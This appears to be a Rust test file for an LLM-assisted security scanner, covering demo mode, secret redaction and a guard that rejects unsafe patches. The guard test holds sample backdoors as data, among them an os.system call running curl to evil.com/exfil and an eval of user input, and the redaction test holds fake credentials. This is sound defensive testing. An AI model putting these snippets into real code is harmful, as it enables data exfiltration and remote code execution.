use secscan_core::models::{Finding, Severity};
use secscan_nebius::client::NebiusClient;
use secscan_nebius::prompts::PromptBuilder;

fn create_mock_finding(rule_id: &str, line: usize) -> Finding {
    Finding {
        id: format!("{}-TEST", rule_id),
        rule_id: rule_id.to_string(),
        rule_name: "Test Vulnerability".to_string(),
        severity: Severity::High,
        confidence: 0.95,
        file_path: "app.py".to_string(),
        line,
        column: 1,
        source: None,
        propagation: vec![],
        sink: None,
        code_snippet: "test_code()".to_string(),
        recommended_fix: "Use secure pattern".to_string(),
        target_framework: "Flask".to_string(),
    }
}

#[tokio::test]
async fn test_client_without_api_key_runs_demonstration_mode() {
    let client = NebiusClient::new().with_api_key("");
    assert!(!client.is_live_configured());

    let finding = create_mock_finding("SEC-001", 42);
    let result = client.explain_finding(&finding, "test context").await;

    assert!(result.is_ok(), "Expected explanation to succeed in demo mode");
    let explanation = result.unwrap();
    assert!(explanation.telemetry.is_mock, "Telemetry should indicate demonstration/mock mode");
    assert!(!explanation.summary.is_empty());
}

#[tokio::test]
async fn test_client_with_invalid_endpoint_returns_network_error() {
    // Point to an invalid local port to simulate network failure / unconfigured host
    let client = NebiusClient::new()
        .with_api_key("sk-invalid-test-token")
        .with_base_url("http://127.0.0.1:59999");

    assert!(client.is_live_configured());

    let finding = create_mock_finding("SEC-001", 42);
    let result = client.explain_finding(&finding, "test context").await;

    assert!(result.is_err(), "Expected connection failure to return Err");
    let err_msg = result.unwrap_err();
    assert!(
        err_msg.contains("Failed to connect") || err_msg.contains("HTTP request failed"),
        "Error message should explain network/connection issue: {}",
        err_msg
    );
}

#[test]
fn test_secret_redaction_in_prompt_context() {
    let raw_file = r#"
import os
JWT_SECRET_KEY = "sk-live-99a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4"
DATABASE_URL = "postgres://admin:secretpassword123@localhost/db"
def run():
    print("hello")
"#;

    let sanitized = PromptBuilder::sanitize_and_minimize_context(raw_file, 3);

    assert!(
        !sanitized.contains("sk-live-99a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4"),
        "Sanitized context must NOT leak the secret API key literal!"
    );
    assert!(
        sanitized.contains("[REDACTED_SECRET]") || sanitized.contains("[REDACTED_TOKEN]"),
        "Sanitized context should include redaction placeholder"
    );
}

#[test]
fn test_pre_patch_safety_guard() {
    // 1. Safe patch
    let safe_patch = r#"
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (username,))
"#;
    assert!(
        NebiusClient::verify_patch_safety(safe_patch),
        "Safe parameterized query must pass safety guard"
    );

    // 2. Dangerous os.system backdoor
    let dangerous_system = r#"
import os
os.system("curl evil.com/exfil")
"#;
    assert!(
        !NebiusClient::verify_patch_safety(dangerous_system),
        "Safety guard must block os.system"
    );

    // 3. Dangerous eval backdoor
    let dangerous_eval = r#"
eval(user_supplied_command)
"#;
    assert!(
        !NebiusClient::verify_patch_safety(dangerous_eval),
        "Safety guard must block eval"
    );

    // 4. Dangerous socket connection
    let dangerous_socket = r#"
import socket
s = socket.socket()
"#;
    assert!(
        !NebiusClient::verify_patch_safety(dangerous_socket),
        "Safety guard must block socket"
    );
}

#[test]
fn test_json_block_extraction() {
    let wrapped = "```json\n{\"summary\": \"Test summary\"}\n```";
    let extracted = NebiusClient::extract_json_block(wrapped);
    assert_eq!(extracted, "{\"summary\": \"Test summary\"}");

    let plain = "{\"summary\": \"Plain summary\"}";
    let extracted_plain = NebiusClient::extract_json_block(plain);
    assert_eq!(extracted_plain, plain);
}
